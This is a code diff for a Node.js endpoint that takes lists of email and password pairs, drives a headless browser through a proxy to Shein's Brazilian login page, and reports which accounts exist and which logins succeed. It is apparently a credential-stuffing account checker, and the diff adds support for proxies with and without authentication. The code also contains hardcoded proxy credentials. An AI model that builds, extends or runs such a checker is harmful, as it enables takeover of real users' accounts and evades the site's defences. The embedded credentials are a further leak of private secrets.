@@ -10,7 +10,7 @@ app.get("/api/login", async (req, res) => {
   let browser;
   try {
     const { lista, proxy_host, proxy_port, proxy_user, proxy_pass } = req.query;
-
+    
     if (!lista || !lista.includes("|")) {
       return res.status(400).json({
         success: false,
@@ -25,13 +25,21 @@ app.get("/api/login", async (req, res) => {
     let proxyPort = "5460";
     let proxyUser = "ynrpepkl";
     let proxyPass = "nbzps5ke6ruj";
+    let useAuth = true;
 
     // Usar proxy personalizado se fornecido
-    if (proxy_host && proxy_port && proxy_user && proxy_pass) {
+    if (proxy_host && proxy_port) {
       proxyHost = proxy_host;
       proxyPort = proxy_port;
-      proxyUser = proxy_user;
-      proxyPass = proxy_pass;
+      
+      // Verificar se tem autenticação
+      if (proxy_user && proxy_pass) {
+        proxyUser = proxy_user;
+        proxyPass = proxy_pass;
+        useAuth = true;
+      } else {
+        useAuth = false; // Proxy sem autenticação
+      }
     }
 
     browser = await puppeteerExtra.launch({
@@ -45,11 +53,13 @@ app.get("/api/login", async (req, res) => {
 
     const page = await browser.newPage();
 
-    // autenticação no proxy
-    await page.authenticate({
-      username: proxyUser,
-      password: proxyPass,
-    });
+    // Autenticação no proxy apenas se necessário
+    if (useAuth) {
+      await page.authenticate({
+        username: proxyUser,
+        password: proxyPass,
+      });
+    }
 
     await page.goto("https://br.shein.com/user/auth/login", {
       waitUntil: "networkidle2",
@@ -80,6 +90,7 @@ app.get("/api/login", async (req, res) => {
           success: false,
           status: "Conta não existe",
           email,
+          proxy: `${proxyHost}:${proxyPort}${useAuth ? ` (auth: ${proxyUser})` : ' (sem auth)'}`
         });
       }
     }
@@ -109,6 +120,7 @@ app.get("/api/login", async (req, res) => {
         status: "Login inválido",
         email,
         senha,
+        proxy: `${proxyHost}:${proxyPort}${useAuth ? ` (auth: ${proxyUser})` : ' (sem auth)'}`
       });
     } else {
       return res.json({
@@ -116,6 +128,7 @@ app.get("/api/login", async (req, res) => {
         status: "Login efetuado",
         email,
         senha,
+        proxy: `${proxyHost}:${proxyPort}${useAuth ? ` (auth: ${proxyUser})` : ' (sem auth)'}`
       });
     }
   } catch (error) {
